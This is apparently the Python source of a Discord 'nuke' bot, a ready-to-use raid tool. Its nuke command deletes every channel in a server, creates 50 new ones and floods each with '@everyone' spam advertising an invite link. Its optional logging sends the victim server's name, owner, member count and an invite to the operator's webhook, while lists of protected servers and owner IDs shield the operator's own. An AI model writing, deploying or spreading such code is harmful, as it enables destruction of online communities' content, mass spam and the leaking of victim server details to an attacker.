import discord
from discord.ext import commands
import requests
import random

protected_servers = [1099524145672359966, 1091190474049589248] # Add server ID seperated by a single comma
owner_ids = [1090223367879131207] # Add user ID seperated by a single comma

nuke_message = "@everyone discord.gg/might"
nuke_channel_name = "fun"
bot_prefix = "!"

logs = False # Set to True to enable logs
log_settings = {
    'log_webhook': 'https://discord.com/api/webhooks/123/abc' # This is where the logs will be sent
}

bot_token = "" # Find this on the discord developer portal

# MAKE SURE ALL INTENTS UNDER THE "GATEWAY INTENTS" SECTION ARE ENABLED

# Below is the bot code, If you dont know what you are doing then you are best to not touch it

client = commands.Bot(command_prefix=bot_prefix, intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    print(f"Logged into {client.user.name}")

@client.command()
async def help(ctx):
    embed = discord.Embed(title="Bot Commands")
    embed.description = f"""
    :thumbsup: `{bot_prefix}invite` - Sends the bot invite link
    :thumbsup: `{bot_prefix}nuke` - Nukes the server
    :crown: `{bot_prefix}fix` - Makes the bot leave all guilds apart from protected servers (OWNER ONLY)
    """

@client.command()
async def invite(ctx):
    url = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
    await ctx.reply(url)

@client.command()
async def nuke(ctx):
    guild = ctx.guild
    if guild.id in protected_servers:
        await ctx.reply("This is a protected server.")
        return
    else:
        pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for _ in range(50):
        try:
            await guild.create_text_channel(name=nuke_channel_name)
        except:
            pass
    
    invite = "discord.gg/might"
    try:
        invite = random.choice(guild.text_channels).create_invite()
    except:
        pass

    if logs == True:
        log_embed = {'title':'Joined Server', 'color':0x2596be, 'footer':
                    {'text':'Nebula Tracker', 'icon_url':'https://cdn.discordapp.com/attachments/1057915288147996682/1057915320402190336/nebula.png'}, 'fields':
                    [{'name':'Server Name', 'value':f'```{guild.name}```', 'inline':'true'},
                    {'name':'Server Members', 'value':f'```{guild.member_count} members```', 'inline':'true'},
                    {'name':'Server Invite', 'value':f'Click [here]({invite}) to join', 'inline':'true'},
                    {'name':'Server Owner', 'value':f'```{guild.owner}```', 'inline':'true'},
                    {'name':'Server Roles', 'value':f'```{len(guild.roles)} roles```', 'inline':'true'},
                    {'name':'Server Boosts', 'value':f'```{str(guild.premium_subscription_count)} boosts```', 'inline':'true'}
                    ]}
        requests.post(log_settings['log_webhook'], json={'embeds':[log_embed]})

@client.command()
async def fix(ctx):
    if ctx.message.author.id in owner_ids:
        for guild in client.guilds:
            if guild.id in protected_servers:
                pass
            else:
                try:
                    await guild.leave()
                except:
                    pass
    else:
        await ctx.reply("This command is an Owner Only command.")
        return

@client.event
async def on_guild_channel_create(channel):
    if channel.guild.id in protected_servers:
        return
    else:
        pass
    for _ in range(50):
        try:
            await channel.send(nuke_message)
        except:
            pass

client.run(bot_token)